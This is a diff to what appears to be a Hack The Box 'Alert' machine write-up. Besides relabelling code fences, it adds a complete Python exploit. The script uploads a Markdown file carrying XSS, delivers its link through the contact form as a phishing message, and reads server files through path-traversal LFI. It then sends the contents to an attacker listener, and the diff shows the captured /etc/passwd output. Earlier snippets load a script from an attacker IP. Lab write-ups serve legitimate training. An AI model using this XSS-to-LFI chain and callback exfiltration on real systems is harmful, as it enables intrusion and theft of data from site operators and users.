@@ -142,7 +142,7 @@ Subsequently, I find this: "https://book.hacktricks.xyz/pentesting-web/xss-cross
 n-markdown". There is a way to get an XSS through Markdown. The tags that worked for me when
 loading the page were these:
 
-```shell
+```javascript
 <!-- XSS with regular tags -->
 <script>alert(1)</script>
 <img src=x onerror=alert(1) />
@@ -151,7 +151,7 @@ loading the page were these:
 Got it. At this point, I thought, "How do I chain this together?" First, I created a file called "xss.md"
 with the following content:
 
-```shell
+```javascript
 <script src="http://<IP-ATTACKER>/pwned.js"></script>
 ```
 
@@ -173,7 +173,7 @@ sharing functionality. It could be that the administrator is seeing this. So, I 
 Since I didn't see anything in messages.php from my side, I will check if the user can access this
 one:
 
-```shell
+```javascript
 var req = new XMLHttpRequest();
 req.open('GET', 'http://alert.htb/messages.php', false);
 req.send();
@@ -189,7 +189,7 @@ With this, we are getting the content of http://alert.htb/messages.php
 
 The result shows a "file" parameter. I'm trying to see if it is vulnerable to LFI.
 
-```shell
+```javascript
 var req = new XMLHttpRequest();
 req.open('GET', 'http://alert.htb/messages.php?file=../../../../../etc/passwd',
 false);
@@ -394,6 +394,211 @@ albert@alert:/tmp$ /bin/bash -p
 
 # Automation script to obtain support point:
 
+```python
+import requests
+from io import BytesIO
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import urllib.parse
+import threading
+from bs4 import BeautifulSoup
+import sys
+import argparse
+import base64
+import time
 
+
+
+parser = argparse.ArgumentParser(description="Alert htb box xss to lfi exploit. by piersi")
+parser.add_argument("-lh", "--lhost", type=str, help="Local host")
+parser.add_argument("-lp", "--lport", type=int, help="Local port", default=8080)
+parser.add_argument("-f", "--file", type=str, help="File to read, example /etc/passwd", default="/etc/passwd")
+
+
+upload_payload_url = "http://alert.htb/visualizer.php"
+delivery_payload_url = "http://alert.htb/contact.php"
+
+
+class Reciver(BaseHTTPRequestHandler):
+    def do_GET(self):
+
+        
+        print("[+] Callback recived")
+        data_recived = self.path.split("text=")[-1] 
+        if not data_recived:
+            error_recived = self.path.split("error=")[-1]
+            if not error_recived:
+                print("[!] Uknown error occured...")
+                exit()
+            else:
+                print("[!] Something went wrong")
+        else:
+            recived_bytes = base64.b64decode(data_recived)
+            recived_text = recived_bytes.decode("utf-8")
+            
+                        
+
+            if "<pre></pre>" in recived_text:
+                print("[+] Specified file not found in the target machine")
+                exit()
+            else:
+                print("\n\n[+] Loot: ")
+                print(recived_text.split("<pre>")[1].split("</pre>")[0])
+        
+
+            self.send_response(200)
+            self.send_header("Content-type", "text/html")
+            self.end_headers()
+            self.wfile.write("ok".encode())
+            exit()
+            
+
+    def log_message(self, format, *args):
+        return
+
+
+def run_server(ip_address, port):
+    server_address = (ip_address, port)
+    httpd = HTTPServer(server_address, Reciver)
+    print("[+] Ready to recive the callback!")
+    httpd.serve_forever()
+
+def generate_payload(localhost, localport, file_to_read):
+
+    payload = '''
+<script>
+window.onload = function() {
+    fetch("/messages.php?file=../../../..FILETOREAD")
+        .then(resp => resp.text())
+        .then(text => {
+            fetch(`http://LHOST:LPORT/?text=${btoa(text)}`);
+        })
+        .catch(err => {
+            fetch(`http://LHOST:LPORT/?err=${err}`);
+        });
+}
+</script>
+    '''
+    return BytesIO(payload.replace("FILETOREAD", file_to_read).replace("LHOST", localhost).replace("LPORT", str(localport)).encode('utf-8'))
+
+
+def extract_payload_link(upload_response, response_code):
+
+    if response_code != 200:
+        print("[!] Failed to upload the payload...")
+        exit()
+
+    soup = BeautifulSoup(upload_response, 'html.parser')
+
+    link = soup.find('a', class_='share-button')['href']
+    
+    return link
+
+
+def send_phising_message(link):
+    email = "piersi@pwner.htb"
+    post_data = { "email" : email, "message" : link }
+    
+    request = requests.post(delivery_payload_url, data=post_data, allow_redirects=False)
+    if request.status_code == 302:
+        if  "successfully!" in request.headers.get("Location"):
+            print("[+] Payload successfully delivered!")
+        else:
+            print("[!] Something went wrong delivering the payload...")
+            exit()
+    else:
+        print("[!] Something went wrong delivering the payload...")
+
+    
+
+def upload_payload(payload):
+    print("[+] Uploading payload...")
+    files = { "file": ("piersi.md", payload, "text/markdown")}
+    response = requests.post(upload_payload_url, files=files )
+    if response.status_code == 200:
+        print("[+] Payload uploaded successfully!")
+        print("[+] Time to deliver the payload! ")
+        return response
+    else:
+        print("[-] Failed to upload the payload...")
+        exit()   
+
+
+def exploit(localhost, localport, file):
+
+    crafted_payload = generate_payload(localhost, localport, file)
+    print("[+] Payload crafted and ready to be sent!")
+    
+    status = upload_payload(crafted_payload)
+    
+    server_thread = threading.Thread(target=run_server, args=(localhost, localport))
+    server_thread.daemon = True
+    server_thread.start()
+
+    send_phising_message(extract_payload_link(status.text, status.status_code))
+
+    time.sleep(2)
+    exit()
+
+    
+if __name__ == "__main__":
+    args = parser.parse_args()
+    if args.lhost == None or args.lport == None:
+        print("[!] Params not provided, please use -h to see all required params")
+        exit()
+    exploit(args.lhost, args.lport, args.file)
+```
+
+The script is quite easy to use, I just have to put my attacker IP, a port to receive the response and the file I want to read:
+
+
+```shell
+   ~/Escritorio/hackthebox/machines/Alert ❯ python3 exploit.py -lh 10.10.16.27 -lp 8080 -f /etc/passwd
+[+] Payload crafted and ready to be sent!
+[+] Uploading payload...
+[+] Payload uploaded successfully!
+[+] Time to deliver the payload!
+[+] Ready to recive the callback!
+[+] Payload successfully delivered!
+[+] Callback recived
+
+
+[+] Loot:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+albert:x:1000:1000:albert:/home/albert:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+david:x:1001:1002:,,,:/home/david:/bin/bash
+```
 
 Github of the script creator: https://github.com/PierSilvioLucchese
